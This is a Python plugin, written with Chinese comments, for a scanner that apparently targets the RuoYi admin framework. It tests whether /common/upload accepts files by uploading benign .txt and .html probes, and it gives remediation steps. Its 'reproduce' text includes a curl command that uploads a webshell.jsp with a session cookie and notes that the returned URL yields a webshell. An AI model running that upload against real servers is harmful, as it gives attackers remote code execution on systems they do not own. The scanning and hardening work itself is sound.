# 任意文件上传：POST /common/upload 上传无害探针，按 JSON 响应判定接口可写
from common.logger import get_logger
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.reachability import login_wall_evidence, login_wall_reason
from lib.reporter import emit
from plugins.base import PluginBase

logger = get_logger(__name__)


class FileUploadPlugin(PluginBase):
    name = "任意文件上传"
    cve = "N/A"
    severity = "high"
    category = "vuln"
    description = "若依后台 /common/upload 未授权可写：上传无害 .txt 探针，响应 JSON 含 url/fileName 字段即存在"
    fix = "强制 /common/upload 鉴权；服务端白名单校验扩展名；上传目录不可执行；按用户隔离存储路径"
    fix_detail = (
        "【权限加固】为 /common/upload 添加 @PreAuthorize(\"@ss.hasPermi('common:upload')\") 注解\n"
        "【代码修复】CommonController.uploadFile() 添加扩展名白名单校验：\n"
        '  String[] allowed = {"jpg","jpeg","png","gif","bmp","doc","docx","xls","xlsx","ppt","pptx","txt","pdf"};\n'
        '  String ext = fileName.substring(fileName.lastIndexOf(".")+1).toLowerCase();\n'
        '  if (!Arrays.asList(allowed).contains(ext)) { throw new ServiceException("不允许的文件类型"); }\n'
        "【目录加固】上传目录禁止执行权限（nginx: location /profile/ { location ~ \\.(jsp|jspx)$ { deny all; } }）\n"
        "【配置加固】application.yml 限制上传大小：spring.servlet.multipart.max-file-size: 10MB\n"
        "【WAF 规则】拦截 Content-Type 含 multipart/form-data 且无 Cookie 的 /common/upload 请求\n"
        "【合规】OWASP A04:2021 不安全设计；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 上传无害 .txt 探针文件验证接口可写：\n"
        'curl -X POST "http://target/common/upload" \\\n'
        '  -F "file=@/tmp/probe.txt;type=text/plain"\n'
        "\n"
        '# 预期响应：HTTP 200 + JSON 含 {"url": "/profile/upload/...", "fileName": "probe.txt"} 字段\n'
        "\n"
        "# 实战利用（上传 webshell.jsp，需登录后台）：\n"
        'curl -X POST "http://target/common/upload" \\\n'
        '  -H "Cookie: JSESSIONID=<已登录的 session>" \\\n'
        '  -F "file=@webshell.jsp;type=application/octet-stream"\n'
        "  # 访问返回的 url 即可获得 webshell"
    )
    # 版本范围：REAL-RUOYI.md 在 4.7.8 实例上实测 CONFIRMED（上传探针返回
    # url/fileName，文件真实落盘）；4.8.x 未取得「已修复」证据。
    # 原范围 <4.7 会把 4.7.8 直接跳过，故放宽为不设上界，由响应证据判定。
    affected_versions = ">=4.0"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
    compliance = "等保2.0:8.1.4;OWASP:A04:2021"
    # D7: WAF 绕过支持
    vuln_type = "rce"
    supports_waf_bypass = True

    # 探针文件名与内容（agents.md §7：仅做存在性验证，不上传可执行文件）
    PROBE_NAME = "ruoyi_scan_probe.txt"
    PROBE_CONTENT = "ruoyi-scan-probe-benign-content"
    # P1-0e：登录后上传维度使用 .html 探针（证明扩展名不受限），内容仍是良性标记
    AUTH_PROBE_NAME = "ruoyi_scan_probe.html"
    AUTH_PROBE_CONTENT = "<html><body>ruoyi_scan_probe</body></html>"
    AUTH_PROBE_MARKER = "ruoyi_scan_probe"

    def verify(self, target, session):
        """匿名上传 + 登录后上传两个维度

        未授权维度必须用匿名会话（旧语义）；登录后维度使用扫描器已认证会话
        （--auth / --auth-login 成功时）上传 .html 探针并回读 URL，证明
        「登录后任意扩展名上传」——R4 实测 .html 可上传且可直接访问。

        @param target: 目标主机，用于拼接上传接口地址
        @param session: 复用的 HTTP 会话对象
        @return: ScanResult——任一维度确认可写为 CONFIRMED；否则按没测到/不存在返回 UNKNOWN/SAFE
        """
        url = join_url(target, "common/upload")

        # 维度一：匿名（未授权）上传
        anon = getattr(session, "anonymous", None)
        probe = anon() if callable(anon) else session
        try:
            anon_result = self._probe_upload(
                target,
                url,
                probe,
                self.PROBE_NAME,
                self.PROBE_CONTENT,
                "text/plain",
                dimension="anonymous",
            )
        finally:
            if probe is not session:
                probe.close()

        # 匿名就能写：更严重，直接返回，不再做登录后维度
        if anon_result.status == STATUS_CONFIRMED:
            anon_result.evidence = "未授权上传：" + anon_result.evidence
            return anon_result

        # 维度二：登录后上传（仅在扫描会话确实认证成功时）
        if not getattr(session, "authenticated", False):
            return anon_result

        auth_result = self._probe_upload(
            target,
            url,
            session,
            self.AUTH_PROBE_NAME,
            self.AUTH_PROBE_CONTENT,
            "text/html",
            dimension="authenticated",
        )
        if auth_result.status == STATUS_CONFIRMED:
            auth_result.evidence = "登录后上传：" + auth_result.evidence
        return auth_result

    def _probe_upload(self, target, url, probe, filename, content, content_type, dimension):
        """执行一次上传探针并判定；dimension=authenticated 时额外回读上传 URL。"""
        files = {"file": (filename, content, content_type)}
        try:
            resp = probe.post(url, files=files)
        except Exception as e:
            emit(no("任意文件上传（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        # 登录墙（302 -> /login 或 200 登录页）：上传接口没被测到，不能判 SAFE
        _wall = login_wall_reason(resp)
        if _wall:
            emit(no("任意文件上传（登录墙拦截）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence=login_wall_evidence(_wall, "上传接口是否可写"),
            )

        # 响应体文本（错误页可能非 JSON，需容错）
        text = resp.text or ""
        ctype = resp.headers.get("Content-Type", "") if hasattr(resp, "headers") else ""

        # 控误报：必须是 JSON 响应 + 解析成功 + 含 url 或 fileName 字段
        # 不直接判定 200：RuoYi 部分版本上传成功 code=200 但 HTTP 状态可能仍是 200，统一以 JSON 内容为准
        # 双通道判 JSON：兼容 Content-Type 缺失/错误（部分版本返回 text/html），再看响应体首字符
        is_json = "json" in ctype.lower() or text.lstrip().startswith("{")
        if not is_json:
            emit(no("不存在任意文件上传漏洞"))
            return ScanResult(
                kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="响应非 JSON（疑似已鉴权拦截）"
            )

        try:
            data = resp.json()
        except Exception:
            emit(no("不存在任意文件上传漏洞"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="响应非合法 JSON")

        # resp.json() 可能返回 JSON 数组/标量（Content-Type 含 json 即通过上面的 is_json），
        # 后续 data.get 会抛 AttributeError，故必须先确认解析结果是对象
        if not isinstance(data, dict):
            emit(no("不存在任意文件上传漏洞"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="响应 JSON 非对象")

        # RuoYi 上传响应：{"code":200,"fileName":"...","url":"/profile/upload/...","newFileName":"..."}
        # 部分版本无 code，但必有 url 或 fileName
        up_url = data.get("url") or ""
        file_name = data.get("fileName") or ""
        code = data.get("code")

        # 控误报：url/fileName 非空且 url 是真实上传路径（显式 scheme 或以 / 开头，
        # 排除 "httpsomething"/"httpx" 这类以 http 开头的任意字符串）
        url_valid = bool(up_url) and (up_url.startswith(("http://", "https://")) or up_url.startswith("/"))
        name_valid = bool(file_name)

        # 鉴权/权限拦截独立判定（不受 url/fileName 字段存在性影响）：
        # 拦截响应可能带 code!=401（如 403）或字符串 "401"，必须在 CONFIRMED 之前排除
        msg = str(data.get("msg", ""))
        if any(kw in msg for kw in ["登录", "请先登录", "unauthorized", "未授权", "认证失败", "无法访问系统资源"]):
            emit(no("不存在任意文件上传漏洞（接口已鉴权）"))
            return ScanResult(
                kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"响应 msg={msg}（疑似拦截）"
            )

        # 登录后维度：上传目录不存在/服务端 500 是基础设施异常，不能判「不存在上传」。
        # R1 实测：/common/upload 返回 FileNotFoundException（profile 目录未创建）。
        if dimension == "authenticated" and (
            code in (500, "500") or "FileNotFoundException" in text or "系统找不到指定的路径" in text
        ):
            emit(no("任意文件上传（登录后上传接口异常）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                status=STATUS_UNKNOWN,
                url=url,
                evidence=f"登录后上传接口返回 code={code}，疑似上传目录不存在/服务端异常：{msg[:200]}",
                extra={"dimension": "authenticated"},
            )

        # 上传成功判定：若依 AjaxResult 成功码是 0（部分版本 200）；无 code 字段也允许。
        # 非成功 code（401/403/500 等，含字符串形式）一律不判 CONFIRMED。
        code_ok = code is None or code in (0, 200, "0", "200")
        if (url_valid or name_valid) and code_ok:
            if dimension == "authenticated":
                # 登录后上传必须回读：只有文件真的可访问，才能证明扩展名限制失效/可落地
                served = False
                served_url = ""
                try:
                    served_url = up_url if up_url.startswith(("http://", "https://")) else join_url(target, up_url)
                    get_resp = probe.get(served_url)
                    body = getattr(get_resp, "text", "") or ""
                    served = getattr(get_resp, "status_code", 0) == 200 and self.AUTH_PROBE_MARKER in body
                except Exception:
                    logger.debug("登录后上传回读失败: %s", up_url, exc_info=True)
                if not served:
                    emit(no("任意文件上传（登录后上传成功但文件不可访问）"))
                    return ScanResult(
                        kind="vuln",
                        name=self.name,
                        status=STATUS_UNKNOWN,
                        url=url,
                        evidence=(
                            f"登录后上传响应成功（code={code} url={up_url}），但回读文件失败/未命中标记，无法证明可访问"
                        ),
                        extra={"uploaded_url": up_url, "file_name": file_name, "dimension": "authenticated"},
                    )
                up_url = served_url or up_url
            emit(ok("存在任意文件上传漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=(
                    f"上传响应 JSON：code={code} url={up_url} fileName={file_name}"
                    + ("（.html 已上传且可回读）" if dimension == "authenticated" else "")
                ),
                extra={
                    "uploaded_url": up_url,
                    "file_name": file_name,
                    "code": code,
                    "dimension": dimension,
                },
                fix=self.fix,
            )

        emit(no("不存在任意文件上传漏洞"))
        return ScanResult(
            kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"响应未含上传字段：{text[:200]}"
        )
